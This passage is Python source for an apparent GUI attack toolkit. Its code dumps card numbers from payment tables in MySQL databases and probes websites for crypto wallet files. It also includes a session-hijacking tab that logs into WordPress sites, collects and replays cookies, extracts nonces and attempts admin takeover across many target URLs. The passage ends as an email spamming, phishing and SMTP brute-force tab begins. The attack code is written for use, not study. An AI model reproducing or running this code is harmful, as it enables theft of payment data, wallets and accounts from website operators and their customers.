    def extract_credit_cards(self, url, timeout, db_host, db_user, db_pass, db_name):
        cards = []
        try:
            if db_host and db_user and db_pass and db_name:
                import pymysql
                connection = pymysql.connect(host=db_host, user=db_user, password=db_pass, database=db_name, connect_timeout=10)
                cursor = connection.cursor()
                cursor.execute('SHOW TABLES')
                all_tables = [table[0] for table in cursor.fetchall()]
                tables = [t for t in all_tables if any((x in t.lower() for x in ['order', 'payment', 'card', 'billing', 'transaction']))]
                for table in tables:
                    try:
                        cursor.execute(f'SELECT * FROM `{table}` LIMIT 100')
                        rows = cursor.fetchall()
                        for row in rows:
                            row_str = ' '.join([str(v) for v in row if v])
                            card_pattern = '\\b(?:\\d{4}[-\\s]?){3}\\d{4}\\b'
                            found_cards = re.findall(card_pattern, row_str)
                            for card in found_cards:
                                cards.append({'card_number': card, 'table': table, 'raw_data': row_str[:200]})
                    except:
                        continue
                cursor.close()
                connection.close()
        except:
            pass
        return cards

    def steal_crypto_wallets(self, url, timeout):
        wallets = []
        try:
            session = requests.Session()
            session.headers.update(DEFAULT_HEADERS.copy())
            wallet_paths = ['/wallet.dat', '/.wallet', '/keystore', '/.bitcoin', '/.ethereum', '/private_key.txt', '/seed.txt', '/.electrum', '/backup.dat']
            for path in wallet_paths:
                try:
                    wallet_url = urljoin(url, path)
                    resp = session.get(wallet_url, timeout=timeout, verify=False)
                    if resp.status_code == 200 and len(resp.content) > 0:
                        wallets.append({'path': path, 'url': wallet_url, 'size': len(resp.content)})
                except:
                    continue
        except:
            pass
        return wallets

    def save_results(self):
        if not self.exfiltrated_data:
            messagebox.showwarning('Warning', 'No exfiltrated data to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'exfiltration_results_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# Data Exfiltration Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Targets: {len(self.exfiltrated_data)}\n\n')
                for result in self.exfiltrated_data:
                    f.write(f"[TARGET] {result['url']}\n")
                    if result.get('database_dumped'):
                        f.write(f"  Database: {result.get('database_path', 'N/A')}\n")
                    if result.get('users'):
                        f.write(f"  Users: {len(result['users'])}\n")
                        for user in result['users'][:10]:
                            f.write(f"    - {user.get('username', 'N/A')} ({user.get('email', 'N/A')})\n")
                    if result.get('emails'):
                        f.write(f"  Emails: {len(result['emails'])}\n")
                        for email in result['emails'][:20]:
                            f.write(f'    - {email}\n')
                    if result.get('cookies'):
                        f.write(f"  Cookies: {len(result['cookies'])}\n")
                    if result.get('cards'):
                        f.write(f"  Credit Cards: {len(result['cards'])}\n")
                    if result.get('crypto'):
                        f.write(f"  Crypto Wallets: {len(result['crypto'])}\n")
                    f.write('\n')
            self.log(f'Results saved to: {filename}', 'fg_green')
            messagebox.showinfo('Success', f'Saved {len(self.exfiltrated_data)} exfiltration results to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg, color)
                self.log_text.see(tk.END)
                lines = int(self.log_text.index('end-1c').split('.')[0])
                if lines > 500:
                    self.log_text.delete(1.0, f'{lines - 200}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                stats_text = f"Total: {stats['total']} | Processed: {stats['processed']} | DB: {stats['databases']} | Users: {stats['users']} | Emails: {stats['emails']} | Cookies: {stats['cookies']} | Crypto: {stats['crypto']} | Cards: {stats['cards']}"
                self.stats_label.config(text=stats_text)
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

class SessionHijackingTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.hijacked_sessions = []
        self.stolen_cookies = []
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'sessions_stolen': 0, 'cookies_stolen': 0, 'csrf_tokens': 0, 'takeovers': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='E.L.V SESSION HIJACKING PROTOCOL', font=('Courier', 20, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        self.setup_input_section(left_frame)
        self.setup_options_section(left_frame)
        self.setup_cookie_manager(left_frame)
        self.setup_results_section(right_frame)

    def setup_input_section(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='Target Input:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(url_frame, text='URL/File:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(url_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)
        cred_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        cred_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(cred_frame, text='Username:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.username_entry = tk.Entry(cred_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=20)
        self.username_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(cred_frame, text='Password:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.password_entry = tk.Entry(cred_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=20, show='*')
        self.password_entry.pack(side=tk.LEFT)

    def setup_options_section(self, parent):
        options_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        options_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(options_frame, text='Session Hijacking Options:', font=('Courier', 10, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        options_inner = tk.Frame(options_frame, bg=self.colors['bg'])
        options_inner.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.session_fixation_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Session Fixation Attack (Fix session ID for target user)', variable=self.session_fixation_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.cookie_steal_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Cookie Stealing (Extract cookies from DB/requests)', variable=self.cookie_steal_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.csrf_extract_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='CSRF Token Extraction (Extract tokens from forms)', variable=self.csrf_extract_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.admin_takeover_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Admin Session Takeover (Hijack admin sessions)', variable=self.admin_takeover_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        config_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        config_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(config_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.threads_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.threads_entry.insert(0, '5')
        self.threads_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(config_frame, text='Timeout:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.timeout_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.timeout_entry.insert(0, '15')
        self.timeout_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.start_button = tk.Button(button_frame, text='[START HIJACKING]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, command=self.start_hijacking, width=25, height=2)
        self.start_button.pack(fill=tk.X, pady=2)
        self.stop_button = tk.Button(button_frame, text='[STOP]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, command=self.stop_hijacking, width=25, height=2, state=tk.DISABLED)
        self.stop_button.pack(fill=tk.X, pady=2)
        self.save_button = tk.Button(button_frame, text='[SAVE RESULTS]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, command=self.save_results, width=25)
        self.save_button.pack(fill=tk.X, pady=2)

    def setup_cookie_manager(self, parent):
        cookie_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        cookie_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        tk.Label(cookie_frame, text='Cookie Manager:', font=('Courier', 10, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        cookie_text_frame = tk.Frame(cookie_frame, bg=self.colors['bg'])
        cookie_text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        self.cookie_text = scrolledtext.ScrolledText(cookie_text_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=10, wrap=tk.WORD)
        self.cookie_text.pack(fill=tk.BOTH, expand=True)
        cookie_button_frame = tk.Frame(cookie_frame, bg=self.colors['bg'])
        cookie_button_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Button(cookie_button_frame, text='Test Cookie', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_green'], command=self.test_cookie, width=12).pack(side=tk.LEFT, padx=2)
        tk.Button(cookie_button_frame, text='Replay Cookie', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.replay_cookie, width=12).pack(side=tk.LEFT, padx=2)
        tk.Button(cookie_button_frame, text='Clear', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_yellow'], command=self.clear_cookies, width=12).pack(side=tk.LEFT, padx=2)

    def setup_results_section(self, parent):
        results_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        results_frame.pack(fill=tk.BOTH, expand=True)
        tk.Label(results_frame, text='Hijacking Results:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.stats_label = tk.Label(results_frame, text='Total: 0 | Processed: 0 | Sessions: 0 | Cookies: 0 | CSRF: 0 | Takeovers: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=10)
        self.stats_label.pack(fill=tk.X, pady=(0, 4))
        self.log_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=20, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        self.results_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=15, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select Target File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, filename)

    def start_hijacking(self):
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showerror('Error', 'Please enter target URL or select a file!')
            return
        try:
            threads = int(self.threads_entry.get() or '5')
            if threads < 1:
                threads = 1
            if threads > 20:
                threads = 20
        except:
            threads = 5
        try:
            timeout = int(self.timeout_entry.get() or '15')
            if timeout < 1:
                timeout = 15
            if timeout > 60:
                timeout = 60
        except:
            timeout = 15
        self.is_running = True
        self.stop_flag = False
        self.hijacked_sessions = []
        self.stolen_cookies = []
        self.stats = {'total': 0, 'processed': 0, 'sessions_stolen': 0, 'cookies_stolen': 0, 'csrf_tokens': 0, 'takeovers': 0}
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f'Starting session hijacking...', 'fg_cyan')
        thread = threading.Thread(target=self.hijacking_worker, args=(url_input, threads, timeout), daemon=True)
        thread.start()

    def stop_hijacking(self):
        self.stop_flag = True
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Hijacking stopped', 'fg_yellow')

    def hijacking_worker(self, url_input, threads, timeout):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (not line.startswith('#')):
                            if line.startswith('http://') or line.startswith('https://'):
                                urls.append(line.rstrip('/'))
            except Exception as e:
                self.log(f'Error reading file: {str(e)[:50]}', 'fg_red')
                self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
                return
        else:
            url = url_input.rstrip('/')
            if url.startswith('http://') or url.startswith('https://'):
                urls.append(url)
        if not urls:
            self.log('No valid URLs found!', 'fg_red')
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            return
        self.stats['total'] = len(urls)
        self.stats_queue.put(self.stats.copy())
        username = self.username_entry.get().strip()
        password = self.password_entry.get().strip()
        max_workers = min(threads, len(urls))
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.hijack_target, url, timeout, username, password): url for url in urls}
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                try:
                    result = future.result()
                    if result:
                        self.hijacked_sessions.append(result)
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            if result.get('session_stolen'):
                                self.stats['sessions_stolen'] += 1
                            if result.get('cookies_stolen'):
                                self.stats['cookies_stolen'] += len(result.get('cookies', []))
                            if result.get('csrf_tokens'):
                                self.stats['csrf_tokens'] += len(result.get('csrf_tokens', []))
                            if result.get('takeover_success'):
                                self.stats['takeovers'] += 1
                        self.stats_queue.put(self.stats.copy())
                        result_summary = f"[HIJACKED] {result['url']} | Session: {result.get('session_stolen', False)} | Cookies: {len(result.get('cookies', []))} | CSRF: {len(result.get('csrf_tokens', []))}\n"
                        self.frame.after(0, lambda rs=result_summary: self.results_text.insert(tk.END, rs, 'green'))
                        self.frame.after(0, lambda: self.results_text.see(tk.END))
                except:
                    pass
        self.is_running = False
        self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
        self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
        self.log(f"Hijacking completed. Total: {self.stats['processed']} | Sessions: {self.stats['sessions_stolen']} | Cookies: {self.stats['cookies_stolen']} | Takeovers: {self.stats['takeovers']}", 'fg_green')

    def hijack_target(self, url, timeout, username, password):
        if self.stop_flag:
            return None
        result = {'url': url, 'session_stolen': False, 'cookies': [], 'csrf_tokens': [], 'takeover_success': False}
        try:
            session = requests.Session()
            session.headers.update(DEFAULT_HEADERS.copy())
            if self.session_fixation_var.get() and username and password:
                self.log(f'[FIXATION] Attempting session fixation on {url}...', 'fg_cyan')
                fixed_session = self.session_fixation_attack(url, timeout, username, password, session)
                if fixed_session:
                    result['session_stolen'] = True
                    result['fixed_session_id'] = fixed_session.get('session_id')
                    self.log(f"[FIXATION-SUCCESS] Session fixed: {fixed_session.get('session_id')[:20]}...", 'fg_green')
            if self.cookie_steal_var.get():
                self.log(f'[COOKIE-STEAL] Stealing cookies from {url}...', 'fg_cyan')
                cookies = self.steal_cookies(url, timeout, session)
                if cookies:
                    result['cookies'] = cookies
                    result['cookies_stolen'] = True
                    for cookie in cookies:
                        self.stolen_cookies.append(cookie)
                        self.frame.after(0, lambda c=cookie: self.cookie_text.insert(tk.END, f"{c.get('name', 'N/A')}={c.get('value', 'N/A')[:50]}...\n", 'green'))
                    self.log(f'[COOKIE-SUCCESS] Stole {len(cookies)} cookies', 'fg_green')
            if self.csrf_extract_var.get():
                self.log(f'[CSRF-EXTRACT] Extracting CSRF tokens from {url}...', 'fg_cyan')
                csrf_tokens = self.extract_csrf_tokens(url, timeout, session)
                if csrf_tokens:
                    result['csrf_tokens'] = csrf_tokens
                    self.log(f'[CSRF-SUCCESS] Extracted {len(csrf_tokens)} CSRF tokens', 'fg_green')
            if self.admin_takeover_var.get() and username and password:
                self.log(f'[TAKEOVER] Attempting admin session takeover on {url}...', 'fg_cyan')
                takeover = self.admin_session_takeover(url, timeout, username, password, session)
                if takeover:
                    result['takeover_success'] = True
                    result['takeover_session'] = takeover.get('session_cookies')
                    self.log(f'[TAKEOVER-SUCCESS] Admin session hijacked', 'fg_green')
            return result
        except Exception as e:
            return None

    def session_fixation_attack(self, url, timeout, username, password, session):
        try:
            login_url = urljoin(url.rstrip('/'), '/wp-login.php')
            resp = session.get(login_url, timeout=timeout, verify=False)
            session_id = session.cookies.get('wordpress_logged_in', '') or session.cookies.get('PHPSESSID', '')
            if not session_id:
                session_id = f'fixed_session_{random.randint(100000, 999999)}'
            login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': urljoin(url, '/wp-admin/'), 'testcookie': '1'}
            login_resp = session.post(login_url, data=login_data, timeout=timeout, verify=False, allow_redirects=True)
            if 'wp-admin' in login_resp.url or 'dashboard' in login_resp.text.lower():
                final_session_id = session.cookies.get('wordpress_logged_in', '') or session.cookies.get('PHPSESSID', '') or session_id
                return {'session_id': final_session_id, 'cookies': dict(session.cookies)}
        except:
            pass
        return None

    def steal_cookies(self, url, timeout, session):
        cookies = []
        try:
            resp = session.get(url, timeout=timeout, verify=False)
            for cookie in session.cookies:
                cookies.append({'name': cookie.name, 'value': cookie.value, 'domain': cookie.domain, 'path': cookie.path, 'secure': cookie.secure})
            login_url = urljoin(url.rstrip('/'), '/wp-login.php')
            login_resp = session.get(login_url, timeout=timeout, verify=False)
            for cookie in session.cookies:
                if not any((c['name'] == cookie.name for c in cookies)):
                    cookies.append({'name': cookie.name, 'value': cookie.value, 'domain': cookie.domain, 'path': cookie.path, 'secure': cookie.secure})
        except:
            pass
        return cookies

    def extract_csrf_tokens(self, url, timeout, session):
        tokens = []
        try:
            login_url = urljoin(url.rstrip('/'), '/wp-login.php')
            resp = session.get(login_url, timeout=timeout, verify=False)
            nonce_patterns = ['name=["\\\']_wpnonce["\\\']\\s+value=["\\\']([^"\\\']+)["\\\']', 'name=["\\\']nonce["\\\']\\s+value=["\\\']([^"\\\']+)["\\\']', 'name=["\\\']csrf_token["\\\']\\s+value=["\\\']([^"\\\']+)["\\\']', 'name=["\\\']_token["\\\']\\s+value=["\\\']([^"\\\']+)["\\\']', 'csrf["\\\']?\\s*:\\s*["\\\']([^"\\\']+)["\\\']']
            for pattern in nonce_patterns:
                matches = re.findall(pattern, resp.text, re.IGNORECASE)
                tokens.extend(matches)
            admin_url = urljoin(url.rstrip('/'), '/wp-admin/')
            admin_resp = session.get(admin_url, timeout=timeout, verify=False)
            for pattern in nonce_patterns:
                matches = re.findall(pattern, admin_resp.text, re.IGNORECASE)
                tokens.extend(matches)
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_inputs = soup.find_all('input', {'name': re.compile('.*nonce.*|.*csrf.*|.*token.*', re.I)})
                for inp in nonce_inputs:
                    val = inp.get('value', '')
                    if val and val not in tokens:
                        tokens.append(val)
        except:
            pass
        return list(set(tokens))

    def admin_session_takeover(self, url, timeout, username, password, session):
        try:
            login_url = urljoin(url.rstrip('/'), '/wp-login.php')
            resp = session.get(login_url, timeout=timeout, verify=False)
            nonce = ''
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_input = soup.find('input', {'name': '_wpnonce'})
                if nonce_input:
                    nonce = nonce_input.get('value', '')
            else:
                nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', resp.text)
                nonce = nonce_match.group(1) if nonce_match else ''
            login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': urljoin(url, '/wp-admin/'), 'testcookie': '1', '_wpnonce': nonce}
            login_resp = session.post(login_url, data=login_data, timeout=timeout, verify=False, allow_redirects=True)
            if 'wp-admin' in login_resp.url or 'dashboard' in login_resp.text.lower():
                admin_resp = session.get(urljoin(url, '/wp-admin/'), timeout=timeout, verify=False)
                if 'dashboard' in admin_resp.text.lower() or 'wp-admin' in admin_resp.url:
                    return {'session_cookies': dict(session.cookies), 'admin_access': True}
        except:
            pass
        return None

    def test_cookie(self):
        cookie_text = self.cookie_text.get(1.0, tk.END).strip()
        if not cookie_text:
            messagebox.showwarning('Warning', 'No cookies to test!')
            return
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter target URL!')
            return
        try:
            timeout = int(self.timeout_entry.get() or '15')
        except:
            timeout = 15
        session = requests.Session()
        session.headers.update(DEFAULT_HEADERS.copy())
        for line in cookie_text.split('\n'):
            if '=' in line:
                name, value = line.split('=', 1)
                session.cookies.set(name.strip(), value.strip())
        try:
            resp = session.get(url_input, timeout=timeout, verify=False)
            if 'wp-admin' in resp.url or 'dashboard' in resp.text.lower():
                self.log(f'[COOKIE-TEST] Cookie valid! Admin access confirmed', 'fg_green')
                messagebox.showinfo('Success', 'Cookie is valid! Admin access confirmed.')
            else:
                self.log(f'[COOKIE-TEST] Cookie invalid or expired', 'fg_yellow')
                messagebox.showwarning('Warning', 'Cookie is invalid or expired.')
        except Exception as e:
            self.log(f'[COOKIE-TEST-ERROR] {str(e)[:50]}', 'fg_red')

    def replay_cookie(self):
        cookie_text = self.cookie_text.get(1.0, tk.END).strip()
        if not cookie_text:
            messagebox.showwarning('Warning', 'No cookies to replay!')
            return
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showwarning('Warning', 'Please enter target URL!')
            return
        try:
            timeout = int(self.timeout_entry.get() or '15')
        except:
            timeout = 15
        session = requests.Session()
        session.headers.update(DEFAULT_HEADERS.copy())
        for line in cookie_text.split('\n'):
            if '=' in line:
                name, value = line.split('=', 1)
                session.cookies.set(name.strip(), value.strip())
        try:
            admin_url = urljoin(url_input.rstrip('/'), '/wp-admin/')
            resp = session.get(admin_url, timeout=timeout, verify=False)
            if 'wp-admin' in resp.url and 'dashboard' in resp.text.lower():
                self.log(f'[COOKIE-REPLAY] Successfully replayed cookie, admin access confirmed', 'fg_green')
                self.frame.after(0, lambda: self.results_text.insert(tk.END, f'[REPLAYED] {url_input} | Admin access confirmed\n', 'green'))
                self.frame.after(0, lambda: self.results_text.see(tk.END))
            else:
                self.log(f'[COOKIE-REPLAY] Cookie replay failed', 'fg_yellow')
        except Exception as e:
            self.log(f'[COOKIE-REPLAY-ERROR] {str(e)[:50]}', 'fg_red')

    def clear_cookies(self):
        self.cookie_text.delete(1.0, tk.END)
        self.stolen_cookies = []
        self.log('Cookie manager cleared', 'fg_yellow')

    def save_results(self):
        if not self.hijacked_sessions:
            messagebox.showwarning('Warning', 'No hijacked sessions to save!')
            return
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'session_hijacking_results_{timestamp}.txt'
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# Session Hijacking Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Targets: {len(self.hijacked_sessions)}\n\n')
                for result in self.hijacked_sessions:
                    f.write(f"[TARGET] {result['url']}\n")
                    if result.get('session_stolen'):
                        f.write(f"  Session ID: {result.get('fixed_session_id', 'N/A')}\n")
                    if result.get('cookies'):
                        f.write(f"  Cookies: {len(result['cookies'])}\n")
                        for cookie in result['cookies'][:10]:
                            f.write(f"    - {cookie.get('name', 'N/A')}={cookie.get('value', 'N/A')[:50]}\n")
                    if result.get('csrf_tokens'):
                        f.write(f"  CSRF Tokens: {len(result['csrf_tokens'])}\n")
                        for token in result['csrf_tokens'][:5]:
                            f.write(f'    - {token[:50]}\n')
                    if result.get('takeover_success'):
                        f.write(f'  Admin Takeover: SUCCESS\n')
                    f.write('\n')
            self.log(f'Results saved to: {filename}', 'fg_green')
            messagebox.showinfo('Success', f'Saved {len(self.hijacked_sessions)} hijacking results to:\n{filename}')
        except Exception as e:
            messagebox.showerror('Error', f'Error saving: {str(e)}')

    def log(self, message, color='fg'):
        timestamp = time.strftime('[%H:%M:%S]')
        log_msg = f'{timestamp} {message}\n'
        self.log_queue.put((log_msg, color))

    def process_log_queue(self):
        try:
            while True:
                log_msg, color = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg, color)
                self.log_text.see(tk.END)
                lines = int(self.log_text.index('end-1c').split('.')[0])
                if lines > 500:
                    self.log_text.delete(1.0, f'{lines - 200}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def process_stats_queue(self):
        try:
            while True:
                stats = self.stats_queue.get_nowait()
                stats_text = f"Total: {stats['total']} | Processed: {stats['processed']} | Sessions: {stats['sessions_stolen']} | Cookies: {stats['cookies_stolen']} | CSRF: {stats['csrf_tokens']} | Takeovers: {stats['takeovers']}"
                self.stats_label.config(text=stats_text)
        except queue.Empty:
            pass
        self.frame.after(500, self.process_stats_queue)

class EmailSpammingTab(BaseTab):

    def __init__(self, root, colors, control_panel=None):
        super().__init__(root, colors, control_panel)
        self.setup_tab()
        self.stop_flag = False
        self.is_running = False
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'emails_harvested': 0, 'emails_sent': 0, 'smtp_breached': 0}
        self.stats_lock = threading.Lock()
        self.harvested_emails = []
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        title = tk.Label(main_frame, text='EMAIL SPAMMING & HARVESTING', font=('Courier', 16, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=(0, 10))
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        harvest_frame = tk.Frame(notebook, bg=self.colors['bg'])
        phishing_frame = tk.Frame(notebook, bg=self.colors['bg'])
        sender_frame = tk.Frame(notebook, bg=self.colors['bg'])
        smtp_frame = tk.Frame(notebook, bg=self.colors['bg'])
        notebook.add(harvest_frame, text='Email Harvester')
        notebook.add(phishing_frame, text='Phishing Generator')
        notebook.add(sender_frame, text='Email Sender')
        notebook.add(smtp_frame, text='SMTP Brute Force')
        self.setup_harvester_tab(harvest_frame)
        self.setup_phishing_tab(phishing_frame)
        self.setup_sender_tab(sender_frame)
        self.setup_smtp_tab(smtp_frame)

    def setup_harvester_tab(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        tk.Label(input_frame, text='Target URL/File:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_entry_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_entry_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.harvest_url_entry = tk.Entry(url_entry_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'])
        self.harvest_url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(url_entry_frame, text='Browse', command=self.browse_harvest_file, font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['fg']).pack(side=tk.LEFT, padx=(5, 0))
        options_frame = tk.Frame(parent, bg=self.colors['bg'])
